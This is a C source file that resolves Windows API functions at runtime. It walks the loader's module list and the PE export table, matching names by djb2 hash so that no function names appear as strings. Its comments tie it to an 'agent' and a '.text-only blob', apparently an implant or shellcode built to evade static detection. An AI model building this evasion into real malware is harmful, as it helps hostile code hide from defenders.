/* system.c - finding functions without an import table (see system.h).
 *
 * Two questions, two answers:
 *   WHERE is a module?   - GetModuleHandleFromPEB (peb.c) walks the
 *     loader in-memory module list and matches a name hash.
 *   WHERE is a function? - the export table walk below: the PE header
 *     of the module describes three parallel arrays (names, ordinals,
 *     addresses); find the name, follow its ordinal, read the address.
 *
 * ByName variants compare literal bytes (kept for local tooling);
 * ByHash variants compare precomputed djb2 constants (apihash.h) and
 * are what the agent uses - no name is ever stored as data.
 *
 * Guarded details that bite:
 *   - both PE32 and PE32+ optional headers (magic decides the export
 *     directory offset - 32-bit modules on 64-bit processes);
 *   - FORWARDED exports: their "address" points back INTO the export
 *     directory (it is a string like "otherdll.Func"), so anything
 *     inside the directory range is refused, not called.
 */

#include "system.h"
#include "djb2.h"
#include "apihash.h"

static BOOL AsciiEquals(const CHAR *left, const CHAR *right)
{
    if (left == NULL || right == NULL)
        return FALSE;

    while (*left != '\0' && *right != '\0') {
        if (*left != *right)
            return FALSE;
        left++;
        right++;
    }

    return (*left == '\0' && *right == '\0');
}

/* djb2 over a NARROW string - the byte-at-a-time twin of Hash()
 * (which walks WCHAR streams). Export names are narrow, module
 * names in the PEB are wide: one algorithm, two widths. */
static UINT64 HashAscii(const CHAR *s)
{
    UINT64 h = API_HASH_SEED;
    for (UINT64 i = 0; s[i] != '\0'; ++i) {
        CHAR c = s[i];
        if (c >= 'A' && c <= 'Z')
            c = (CHAR)(c - 'A' + 'a');
        h = ((h << 5) + h) + (UINT64)(UINT8)c;
    }
    return h;
}


PVOID ResolveExportByName(PVOID moduleBase, const CHAR *exportName)
{
    if (moduleBase == NULL || exportName == NULL)
        return NULL;

    PUINT8 base = (PUINT8)moduleBase;
    PIMAGE_DOS_HEADER_MIN dos = (PIMAGE_DOS_HEADER_MIN)base;

    if (dos->e_magic != IMAGE_DOS_SIGNATURE_MIN)
        return NULL;

    PUINT8 nt = base + dos->e_lfanew;
    if (*(PUINT32)nt != IMAGE_NT_SIGNATURE_MIN)
        return NULL;

    PUINT8 optionalHeader = nt + 24;
    UINT16 optionalMagic = *(PUINT16)optionalHeader;

    UINT32 exportRva = 0;
    UINT32 exportSize = 0;
    if (optionalMagic == IMAGE_NT_OPTIONAL_HDR32_MAGIC_MIN) {
        exportRva = *(PUINT32)(optionalHeader + IMAGE_EXPORT_DIRECTORY_RVA_32 +
                               (IMAGE_DIRECTORY_ENTRY_EXPORT_MIN * 8));
        exportSize = *(PUINT32)(optionalHeader + IMAGE_EXPORT_DIRECTORY_RVA_32 +
                                (IMAGE_DIRECTORY_ENTRY_EXPORT_MIN * 8) + 4);
    } else if (optionalMagic == IMAGE_NT_OPTIONAL_HDR64_MAGIC_MIN) {
        exportRva = *(PUINT32)(optionalHeader + IMAGE_EXPORT_DIRECTORY_RVA_64 +
                               (IMAGE_DIRECTORY_ENTRY_EXPORT_MIN * 8));
        exportSize = *(PUINT32)(optionalHeader + IMAGE_EXPORT_DIRECTORY_RVA_64 +
                                (IMAGE_DIRECTORY_ENTRY_EXPORT_MIN * 8) + 4);
    } else {
        return NULL;
    }

    if (exportRva == 0)
        return NULL;

    PIMAGE_EXPORT_DIRECTORY_MIN exportDir =
        (PIMAGE_EXPORT_DIRECTORY_MIN)(base + exportRva);

    PUINT32 names = (PUINT32)(base + exportDir->AddressOfNames);
    PUINT16 ordinals = (PUINT16)(base + exportDir->AddressOfNameOrdinals);
    PUINT32 functions = (PUINT32)(base + exportDir->AddressOfFunctions);

    for (UINT32 i = 0; i < exportDir->NumberOfNames; i++) {
        const CHAR *name = (const CHAR *)(base + names[i]);
        if (!AsciiEquals(name, exportName))
            continue;

        UINT16 ordinal = ordinals[i];
        if (ordinal >= exportDir->NumberOfFunctions)
            return NULL;

        UINT32 functionRva = functions[ordinal];

        /* Forwarded exports point back inside .edata and need a second lookup. */
        if (functionRva >= exportRva && functionRva < exportRva + exportSize)
            return NULL;

        return (PVOID)(base + functionRva);
    }

    return NULL;
}

/* Hash twin of ResolveExportByName: walks the export table comparing
 * precomputed constants (apihash.h) instead of literal strings - no
 * .rdata literal is consulted, so the .text-only blob survives here. */
PVOID ResolveExportByHash(PVOID moduleBase, UINT64 exportHash)
{
    if (moduleBase == NULL)
        return NULL;

    PUINT8 base = (PUINT8)moduleBase;
    PIMAGE_DOS_HEADER_MIN dos = (PIMAGE_DOS_HEADER_MIN)base;

    if (dos->e_magic != IMAGE_DOS_SIGNATURE_MIN)
        return NULL;

    PUINT8 nt = base + dos->e_lfanew;
    if (*(PUINT32)nt != IMAGE_NT_SIGNATURE_MIN)
        return NULL;

    PUINT8 optionalHeader = nt + 24;
    UINT16 optionalMagic = *(PUINT16)optionalHeader;

    UINT32 exportRva = 0;
    UINT32 exportSize = 0;
    if (optionalMagic == IMAGE_NT_OPTIONAL_HDR32_MAGIC_MIN) {
        exportRva = *(PUINT32)(optionalHeader + IMAGE_EXPORT_DIRECTORY_RVA_32 +
                               (IMAGE_DIRECTORY_ENTRY_EXPORT_MIN * 8));
        exportSize = *(PUINT32)(optionalHeader + IMAGE_EXPORT_DIRECTORY_RVA_32 +
                                (IMAGE_DIRECTORY_ENTRY_EXPORT_MIN * 8) + 4);
    } else if (optionalMagic == IMAGE_NT_OPTIONAL_HDR64_MAGIC_MIN) {
        exportRva = *(PUINT32)(optionalHeader + IMAGE_EXPORT_DIRECTORY_RVA_64 +
                               (IMAGE_DIRECTORY_ENTRY_EXPORT_MIN * 8));
        exportSize = *(PUINT32)(optionalHeader + IMAGE_EXPORT_DIRECTORY_RVA_64 +
                                (IMAGE_DIRECTORY_ENTRY_EXPORT_MIN * 8) + 4);
    } else {
        return NULL;
    }

    if (exportRva == 0)
        return NULL;

    PIMAGE_EXPORT_DIRECTORY_MIN exportDir =
        (PIMAGE_EXPORT_DIRECTORY_MIN)(base + exportRva);

    PUINT32 names = (PUINT32)(base + exportDir->AddressOfNames);
    PUINT16 ordinals = (PUINT16)(base + exportDir->AddressOfNameOrdinals);
    PUINT32 functions = (PUINT32)(base + exportDir->AddressOfFunctions);

    for (UINT32 i = 0; i < exportDir->NumberOfNames; i++) {
        const CHAR *name = (const CHAR *)(base + names[i]);
        if (HashAscii(name) != exportHash)
            continue;

        UINT16 ordinal = ordinals[i];
        if (ordinal >= exportDir->NumberOfFunctions)
            return NULL;

        UINT32 functionRva = functions[ordinal];

        /* Forwarded exports point back inside .edata and need a second lookup. */
        if (functionRva >= exportRva && functionRva < exportRva + exportSize)
            return NULL;

        return (PVOID)(base + functionRva);
    }

    return NULL;
}

PVOID ResolveFromModuleByName(const WCHAR *moduleName, const CHAR *exportName)
{
    PVOID moduleBase = GetModuleHandleFromPEB(Hash(moduleName));
    return ResolveExportByName(moduleBase, exportName);
}

/* Hash twin of ResolveFromModuleByName: module by precomputed hash
 * (apihash.h), export by precomputed hash. The resolve chain then
 * carries no string literals at all. */
PVOID ResolveFromModuleByHash(UINT64 moduleNameHash, UINT64 exportHash)
{
    PVOID moduleBase = GetModuleHandleFromPEB(moduleNameHash);
    return ResolveExportByHash(moduleBase, exportHash);
}